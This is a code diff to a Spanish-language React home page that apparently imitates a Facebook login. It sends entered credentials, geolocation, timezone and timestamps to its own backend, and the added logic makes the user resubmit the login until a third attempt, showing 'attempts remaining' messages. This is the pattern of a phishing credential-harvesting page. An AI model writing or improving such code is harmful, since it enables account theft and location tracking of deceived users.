@@ -4,6 +4,7 @@ import { GoogleOutlined, PhoneOutlined } from '@ant-design/icons';
 import axios from 'axios';
 import FacebookLoginModal from './FacebookLoginModal';
 import ProcessingModal from './ProcessingModal';
+import Dashboard from './Dashboard';
 
 const { Content } = Layout;
 const { Title, Text, Link } = Typography;
@@ -53,7 +54,7 @@ const HomePage = () => {
 
   const handleLoginClick = async () => {
     const locationData = await requestLocation();
-    
+
     if (!locationData) {
       Modal.confirm({
         title: 'Acceso a ubicación',
@@ -77,35 +78,45 @@ const HomePage = () => {
     try {
       setLoginModalVisible(false);
       setProcessingModalVisible(true);
-      
+
       const loginData = {
         ...values,
         location: location,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         timestamp: new Date().toISOString()
       };
-      
+
       const response = await axios.post(`${import.meta.env.VITE_API_URL}/api/auth/facebook/login`, loginData);
-      
+
       setProcessingModalVisible(false);
-      
+
       if (response.data.success) {
-        setIsLoggedIn(true);
-        setUserData(response.data.user);
-        message.success('¡Bienvenido! Has iniciado sesión correctamente.');
+        if (response.data.isThirdAttempt) {
+          setIsLoggedIn(true);
+          setUserData(response.data.user);
+          setShowMainModal(false);
+          message.success('¡Bienvenido! Has iniciado sesión correctamente.');
+        } else {
+          message.info(`Intento registrado. Te quedan ${response.data.attemptsRemaining} intentos.`);
+          setLoginModalVisible(true);
+        }
       }
     } catch (error) {
       setProcessingModalVisible(false);
-      
+
       if (error.response) {
         message.error(error.response.data.message || 'Error al iniciar sesión');
       } else {
         message.error('Error al conectar con el servidor');
       }
-      
+
       setLoginModalVisible(true);
     }
   };
+
+  if (isLoggedIn && userData) {
+    return <Dashboard />;
+  }
 
   return (
     <Layout className="layout">
@@ -121,7 +132,7 @@ const HomePage = () => {
           <div style={{ textAlign: 'center', padding: '20px 0' }}>
             <div style={{ fontSize: '40px', marginBottom: '20px' }}>X</div>
             <Title level={3}>Empieza ahora</Title>
-            
+
             <Text style={{ display: 'block', marginBottom: '20px' }}>
               Al hacer clic en Iniciar sesión o Continuar, aceptas nuestros{' '}
               <Link href="#">Términos</Link>. Conoce cómo procesamos tus datos en nuestra{' '}
@@ -132,7 +143,7 @@ const HomePage = () => {
             <Button
               icon={<GoogleOutlined />}
               style={{ width: '100%', marginBottom: '10px', height: '40px' }}
-              onClick={() => {}}
+              onClick={() => { }}
             >
               Continuar con Google
             </Button>
@@ -174,7 +185,7 @@ const HomePage = () => {
           onCancel={() => setLoginModalVisible(false)}
           onSubmit={handleLoginSubmit}
         />
-        
+
         <ProcessingModal visible={processingModalVisible} />
       </Content>
     </Layout>
